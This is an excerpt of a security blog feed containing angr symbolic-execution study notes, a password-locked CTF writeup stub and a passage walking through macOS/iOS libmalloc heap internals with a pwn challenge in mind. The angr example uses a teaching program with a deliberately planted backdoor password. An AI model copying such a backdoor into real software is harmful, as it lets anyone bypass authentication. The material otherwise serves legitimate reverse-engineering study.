    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if 